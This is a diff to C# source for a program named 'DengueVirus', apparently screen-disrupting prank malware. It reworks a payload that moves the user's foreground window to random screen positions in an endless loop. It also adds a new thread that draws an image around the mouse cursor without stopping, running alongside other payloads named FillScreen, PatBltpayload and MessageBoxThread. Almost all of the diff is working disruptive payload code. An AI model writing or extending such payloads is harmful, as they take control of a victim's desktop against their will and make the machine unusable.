@@ -249,16 +249,19 @@ namespace DengueVirus
                 }
             }
         }
+        int systemMetricsX = GetSystemMetrics(0);
+        int systemMetricsY = GetSystemMetrics(1);
+        Random random = new Random();
 
-        static void WindowPosSpam()
+        public void WindowPosSpam()
         {
-            int systemMetricsX = GetSystemMetrics(0);
-            int systemMetricsY = GetSystemMetrics(1);
+            
             GetDC(IntPtr.Zero);
-            Stopwatch stopwatch = Stopwatch.StartNew();
+            //Stopwatch stopwatch = Stopwatch.StartNew();
+            
             while (true)
             {
-                long v1 = stopwatch.ElapsedTicks;
+                /*long v1 = stopwatch.ElapsedTicks;
                 uint v14 = (((uint)v1 << 13) ^ (uint)v1) << 17 ^ ((uint)v1 << 13) ^ (uint)v1;
                 long v2 = stopwatch.ElapsedTicks;
                 int v3 = (int)v2;
@@ -268,19 +271,39 @@ namespace DengueVirus
                 int v7 = (((v3 << 13) ^ v3) << 17) ^ (v3 << 13) ^ v3;
                 int v8 = (((v5 << 13) ^ v5) << 17) ^ (v5 << 13) ^ v5;
                 uint v9 = (((uint)v6 << 13) ^ (uint)v6) << 17 ^ ((uint)v6 << 13) ^ (uint)v6;
+                */
                 IntPtr foregroundWindow = GetForegroundWindow();
                 SetWindowPos(
                     foregroundWindow,
                     IntPtr.Zero,
-                    (int)((v9 ^ (32 * v9)) % (uint)systemMetricsX),
-                    (int)(((uint)v8 ^ (32 * v8)) % (uint)systemMetricsY),
-                    (int)(((uint)v7 ^ (32 * v7)) % (uint)systemMetricsX),
-                    (int)((v14 ^ (32 * v14)) % (uint)systemMetricsY),
+                    random.Next(0, systemMetricsX),
+                    random.Next(0, systemMetricsY),
+                    random.Next(0, systemMetricsX),
+                    random.Next(0, systemMetricsY),
                     0);
-                long v11 = stopwatch.ElapsedTicks;
-                uint v12 = (((uint)v11 << 13) ^ (uint)v11) << 17 ^ ((uint)v11 << 13) ^ (uint)v11;
+                //long v11 = stopwatch.ElapsedTicks;
+                //uint v12 = (((uint)v11 << 13) ^ (uint)v11) << 17 ^ ((uint)v11 << 13) ^ (uint)v11;
                 //Sleep((uint)(((32 * v12) ^ v12) % 0x320 + 600));
-                Thread.Sleep((int)(((32 * v12) ^ v12) % 0x320 + 600));
+                Thread.Sleep(random.Next(1, 200));
+            }
+        }
+
+        private void ImageFollowMouse()
+        {
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            using (Graphics g = Graphics.FromHdc(hdc))
+            {
+                g.InterpolationMode = InterpolationMode.Low;
+                g.CompositingQuality = CompositingQuality.HighSpeed;
+                g.SmoothingMode = SmoothingMode.HighSpeed;
+                g.PixelOffsetMode = PixelOffsetMode.HighSpeed;
+                Brush b = new SolidBrush(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
+                while (true)
+                {
+                    // Desenhar na posição do cursor do mouse
+                    g.DrawImage(Properties.Resources.manface, Cursor.Position.X + random.Next(-10, 10), Cursor.Position.Y + random.Next(-10, 10), random.Next(50, 100), random.Next(50, 100));
+                    Thread.Sleep(1);
+                }
             }
         }
 
@@ -375,11 +398,14 @@ namespace DengueVirus
                 Cursor = Cursors.Default;
             }
 
-            
-
             SpicyPL.WriteNote();
 
-            Thread.Sleep(12000);
+            //Thread.Sleep(12000);
+            /*SoundPlayer audio = new SoundPlayer(Properties.Resources.speaker);
+            audio.Load(); // Ensure the audio is loaded before playing
+            audio.Play();*/
+
+            Thread.Sleep(8000);
 
             Thread winpos = new Thread(WindowPosSpam); winpos.Start();
             Thread fill = new Thread(FillScreen); fill.Start();
@@ -394,6 +420,7 @@ namespace DengueVirus
             t3.Abort();
             Thread t5 = new Thread(PatBltpayload); t5.Start();
             Thread t6 = new Thread(MessageBoxThread); t6.Start();
+            Thread sigma = new Thread(ImageFollowMouse); sigma.Start();
 
             SpicyPL.UserNote();
             //Thread aaa = new Thread(ChangeButtonSize); aaa.Start();
@@ -415,6 +442,7 @@ namespace DengueVirus
 
             winpos.Abort();
             fill.Abort();
+            sigma.Abort();
         }
 
         private void button1_Click(object sender, EventArgs e)
